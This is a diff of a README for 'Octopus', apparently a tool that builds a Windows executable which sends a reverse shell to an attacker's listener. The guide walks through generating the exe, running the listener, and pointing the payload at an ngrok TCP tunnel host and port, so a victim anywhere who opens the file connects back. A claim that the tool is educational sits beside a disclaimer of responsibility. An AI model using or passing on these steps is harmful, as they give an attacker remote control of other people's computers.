@@ -1,4 +1,3 @@
-
 # Octopus
 
 Octopus is a tool which can generate an exe which can return a
@@ -17,9 +16,6 @@ people can get the basic idea how reverse shell works
 
 #### I will not be responsible for any of your acts.
 
-
-
-
 # Installation
 
 Install octopus
@@ -28,13 +24,12 @@ Install octopus
 git clone https://github.com/Rajas2323/octopus
 ```
 
-The octopusgenerator.py script will only work on windows currently
+The octopus tool (listener.py + octopusgenerator.py) will only work on windows currently
 because nuikta which is an exe generator tool for python was
-giving errors when I tested it on linix. I may fix this issue
-later
-    
-# Usage/Examples
+giving errors when I tested it on linux. And ngrok port forwarding will also not work
+on linux, the reason is still unknown to me but I will try to find a solution for this
 
+# Usage/Examples
 
 ## Localhost Usage Example
 
@@ -42,8 +37,8 @@ If you want to test octopus locally, follow the given steps
 
 in the octopus directory, there are two python files
 
-* listener.py
-* octopusgenerator.py 
+- listener.py
+- octopusgenerator.py
 
 we will generate the the exe by running the command
 
@@ -52,6 +47,7 @@ python octopusgenerator.py -H 127.0.0.1 -p 4444 -o exename.exe
 ```
 
 now we will listen for connections by running
+
 ```bash
 python listener.py
 ```
@@ -60,7 +56,6 @@ now the listener script will ask you to enter port on which
 you want to listen, in this example the port is 4444, so we will have
 to enter there 4444. Now when you will double click or open the
 exe, it will send reverse shell on the listener.
-
 
 ## Remote Usage Example
 
@@ -76,7 +71,7 @@ Now I won't tell you how to download and setup ngrok. Moving
 directly to the usage, we will execute command,
 
 ```bash
-ngrok tcp 4444
+.\ngrok.exe tcp 4444
 ```
 
 Now ngrok tool will show you this on terminal
@@ -95,17 +90,16 @@ Forwarding           tcp://0.tcp.in.ngrok.io:19280 -> localhost:4444
 Now ngrok has created a tcp tunnel which will forward the
 connections to 127.0.0.1:4444 on which we will run our listener
 
-The important information shown is Forwarding, 
+The important information shown is Forwarding,
 ngrok is forwarding connections which connect to
 0.tcp.in.ngrok.io on port 19280 in this example to 127.0.0.1:4444
 Now you don't have to close ngrok at all
-
 
 So while generating octopus exe, will set host to our ngrok tcp link
 which is 0.tcp.in.ngrok.io and we will set port to our ngrok port
 which is 19280 in this example..
 
-So the command to generate exe will be 
+So the command to generate exe will be
 
 ```bash
 python octopusgenerator.py -H 0.tcp.in.ngrok.io -p 19280 -o exename.exe
